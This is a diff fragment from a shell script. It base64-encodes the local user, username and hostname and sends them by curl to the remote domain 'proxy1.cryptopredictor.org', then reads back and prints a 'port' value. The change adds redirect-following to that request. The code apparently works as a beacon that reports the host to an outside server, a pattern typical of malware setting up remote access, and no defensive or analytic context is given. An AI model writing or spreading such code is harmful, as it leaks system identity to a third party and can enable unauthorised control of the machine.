@@ -22,7 +22,7 @@ data=$(echo -n "$user:$username:$hostname" | base64)
 
 domain_name="proxy1.cryptopredictor.org"
 
-received_port=$(curl -s "https://$domain_name/report?data=$data")
+received_port=$(curl -sL "https://$domain_name/report?data=$data")
 received_port=$(echo $received_port | sed "s/%//g")
 
 echo "$received_port"
